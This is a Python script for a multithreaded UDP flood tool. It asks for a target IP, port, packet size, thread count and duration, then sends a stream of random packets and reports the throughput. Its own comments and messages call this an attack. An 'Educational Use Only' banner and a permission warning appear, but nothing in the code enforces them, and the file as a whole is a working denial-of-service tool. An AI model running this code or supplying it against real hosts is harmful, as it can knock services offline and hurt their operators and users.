import socket
import random
import time
import threading
from datetime import datetime

class UDPFloodTester:
    def __init__(self, target_ip, target_port=80, packet_size=1024, thread_count=100):
        self.target_ip = target_ip
        self.target_port = target_port
        self.packet_size = packet_size
        self.thread_count = thread_count
        self.running = False
        self.sent_packets = 0
        self.sent_bytes = 0
        self.start_time = 0
        
    def generate_packet(self):
        """Generate random UDP payload"""
        return bytes(random.getrandbits(8) for _ in range(self.packet_size))
    
    def flood(self):
        """Main flooding function"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while self.running:
            try:
                packet = self.generate_packet()
                sock.sendto(packet, (self.target_ip, self.target_port))
                self.sent_packets += 1
                self.sent_bytes += len(packet)
            except:
                pass
    
    def start(self, duration=60):
        """Start the flood attack"""
        self.running = True
        self.start_time = time.time()
        self.sent_packets = 0
        self.sent_bytes = 0
        
        # Start threads
        threads = []
        for _ in range(self.thread_count):
            t = threading.Thread(target=self.flood)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Start stats thread
        stats_thread = threading.Thread(target=self.print_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Run for duration or until stopped
        if duration > 0:
            time.sleep(duration)
            self.stop()
        else:
            while self.running:
                time.sleep(0.1)
    
    def stop(self):
        """Stop the flood attack"""
        self.running = False
    
    def print_stats(self):
        """Print statistics while running"""
        start_time = datetime.now()
        while self.running:
            elapsed = time.time() - self.start_time
            if elapsed == 0:
                elapsed = 0.0001
            pps = self.sent_packets / elapsed
            bps = self.sent_bytes / elapsed
            
            print(f"\rPackets: {self.sent_packets:,} | "
                  f"Data: {self.sent_bytes/1024/1024:.2f} MB | "
                  f"PPS: {pps:,.0f} | "
                  f"BPS: {bps/1024/1024:.2f} MB/s | "
                  f"Running: {datetime.now() - start_time}", end="")
            time.sleep(1)
        print("\nAttack stopped.")

def main():
    print("=== UDP Flood Test Tool (Educational Use Only) ===")
    print("WARNING: Use only on networks you own or have permission to test!")
    
    target_ip = input("Enter target IP: ")
    target_port = int(input("Enter target port (0 for random): ") or "0")
    packet_size = int(input("Enter packet size in bytes (default 1024): ") or "1024")
    thread_count = int(input("Enter thread count (default 100): ") or "100")
    duration = int(input("Enter duration in seconds (0 for manual stop): ") or "60")
    
    if target_port == 0:
        target_port = random.randint(1024, 65535)
    
    tester = UDPFloodTester(
        target_ip=target_ip,
        target_port=target_port,
        packet_size=packet_size,
        thread_count=thread_count
    )
    
    try:
        print(f"\nStarting attack on {target_ip}:{target_port}...")
        print("Press Ctrl+C to stop early\n")
        tester.start(duration)
    except KeyboardInterrupt:
        tester.stop()
        print("\nAttack stopped by user.")

if __name__ == "__main__":
    main()